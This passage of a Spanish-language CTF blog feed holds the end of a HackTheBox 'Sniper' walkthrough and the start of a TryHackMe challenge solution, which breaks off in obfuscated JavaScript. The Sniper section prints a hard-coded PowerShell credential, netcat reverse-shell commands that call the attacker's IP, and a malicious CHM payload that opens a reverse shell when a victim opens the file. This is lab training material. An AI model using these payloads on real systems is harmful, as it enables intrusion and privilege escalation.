&lt;/div&gt;&lt;p&gt;Vemos que Chris tiene permisos de escritura y lectura en (.) la maquina. Intentamos utilizar smbclient y los modulos de metasploit para samba pero ninguno de ellos sirvio para obtener una shell. Por lo que utilizamos la misma tecnica que utilizamos con la maquina &lt;a href=&#34;https://sckull.github.io/posts/arkham/#user-batman&#34;&gt;&lt;strong&gt;Arkham de HackTheBox&lt;/strong&gt;&lt;/a&gt; en la que utilizamos las credenciales para obtener una sesion nueva utilizando powershell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Sniper\Chris&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;convertto-securestring&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-String&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;36mEAhz/B8xQ~2VM&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Management&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Automation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSCredential&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;nb&#34;&gt;New-PSSession&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Credential&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Enter-PSSession&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al ejecutar estos comandos nos muestra una shell en localhost con el usuario Chris, pero, no podemos saltar hacia otras carpetas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203242.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para obtener una shell con el usuario Chris utilizamos el mismo comando que utilizamos para obtener una shell con IUSR.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.15.244&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;est&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;c.exe -e C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indowsPowerShell&lt;span class=&#34;se&#34;&gt;\v&lt;/span&gt;1.0&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;owershell.exe 10.10.15.244 &lt;span class=&#34;m&#34;&gt;448&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203433.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation-ctf-like---malicious-chm-file&#34;&gt;Privilege Escalation (CTF Like) - Malicious CHM file&lt;/h2&gt;
&lt;p&gt;Enumeramos los directorios de Chris, vemos un archivo chm el cual se encuentra en &lt;code&gt;C:\Users\Chris\Downloads&lt;/code&gt; llamado instructions.chm.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203728.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al abrirlo en Windows nos muestra un mensaje.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Pff... This dumb CEO always makes me do all the shitty work. SMH!
I&#39;m never completing this thing. Gonna leave this place next week. Hope someone snipes him.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203803.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;De igual forma encontramos una nota en &lt;code&gt;C:\Docs&lt;/code&gt; y un PDF.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203938.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;php for dummies-trial.pdf:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_204057.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;note.txt:
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&lt;span class=&#34;s1&#34;&gt;&amp;#39;ve prepared the documentation for our new app. Drop it here when you&amp;#39;&lt;/span&gt;re &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; with it.

Regards,
Sniper CEO.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos claramente en la nota que, Chris debe de reparar los bugs que existen en la pagina, luego de eso realizar la documentacion (instructions.chm al parecer) y dejarlos en la misma carpeta que la nota.&lt;/p&gt;
&lt;p&gt;Copiamos el archivo instructions.chm en C:\Docs y despues de un tiempo el archivo desaparece, por lo que asumimos que es eliminado o revisado por el CEO (&amp;ldquo;Administrador&amp;rdquo;).&lt;/p&gt;
&lt;p&gt;Creamos un archivo CHM el cual contenga un comando para obtener una shell inversa, utilizamos &amp;ldquo;Microsoft HTML Help Workshop and Documentation&amp;rdquo; para generarlo.&lt;/p&gt;
&lt;p&gt;Agregamos al archivo principal nuestro siguiente payload entre la etiqueta BODY:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;OBJECT&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;classid=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;width=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;height=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Command&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ShortCut&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Button&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Bitmap::shortcut&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Item1&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;,cmd.exe,/c C:\Users\Chris\Documents\nc.exe 10.10.15.244 449 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&amp;#39;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Item2&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;273,1,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/OBJECT&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;SCRIPT&amp;gt;&lt;/span&gt;
  x.Click();
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/SCRIPT&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Trasladamos nuestro archivo a la carpeta &lt;code&gt;C:\Docs&lt;/code&gt;, netcat (nc.exe) y esperamos a que nuestro payload sea ejecutado:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_210525.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra shell con permisos de administrador y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_211231.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/sniper/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/sniper/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Stealthcopter CTF Primer1</title>
        <link>https://sckull.github.io/posts/stealthcopter/</link>
        <pubDate>Mon, 16 Mar 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 16 Mar 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/stealthcopter/</guid>
        <description>Stealthcopter CTF Primer es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.</description>
        <content:encoded>&lt;p&gt;Stealthcopter CTF Primer es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Stealthcopter ctf primer1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;CTF primer containing 40 challenges (web, network, crypto and forensics) for beginnners&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;8481&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/stealthcopter&#34;&gt;stealthcopter&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;web&#34;&gt;WEB&lt;/h1&gt;
&lt;h2 id=&#34;w01&#34;&gt;w.01&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Revisa el codigo fuente de la pagina.&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;w02&#34;&gt;w.02&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Repara el nombre del script en la cabecera del archivo HTML y revisa la consola (developmer tools).&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;w03&#34;&gt;w.03&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Imagen base64 codificada.&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-16%2002.00.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;w04&#34;&gt;w.04&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Elimina los // en el codigo fuente.&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-16%2002.02.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;w05&#34;&gt;w.05&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Key bruteforce o adivina ;).&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/web$ php w.05.php &lt;span class=&#34;s1&#34;&gt;&amp;#39;key=7&amp;#39;&lt;/span&gt;
Key entered: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
CipherText: &lt;span class=&#34;nv&#34;&gt;T3FiSXVlOFYvVTJCRHRnRFdTRUZOeHplNVZpK0pQZUVUbWNmTHNCZUt5RT0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
PlainText: FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;n0t_s0_t0ugh&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; 
sckull@uplifted:~/tmp/web$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;w06&#34;&gt;w.06&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x550c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HsOde8OyacKIw518XMKNPsO8SMO7w4JxwoPCugDCiwh4w43Cqw==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;CcK3wq4=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1421f9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xa7900b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x371c54&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5f2f93&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5f2f93&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1421f9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;push&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1421f9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shift&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]());}};&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x371c54&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xa7900b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);}(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x550c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1e6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xec1512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x3f22ed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xec1512&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xec1512&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x353971&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x550c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xec1512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wlUhtf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x353626&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x1efe97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1efe97&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;return\x20(function()\x20&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{}.constructor(\x22return\x20this\x22)(\x20)&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;);&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)();}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x299503&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1efe97&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x1efe97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;};&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x53087e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x353626&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x4b80a9&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x53087e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;atob&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x53087e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;atob&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span 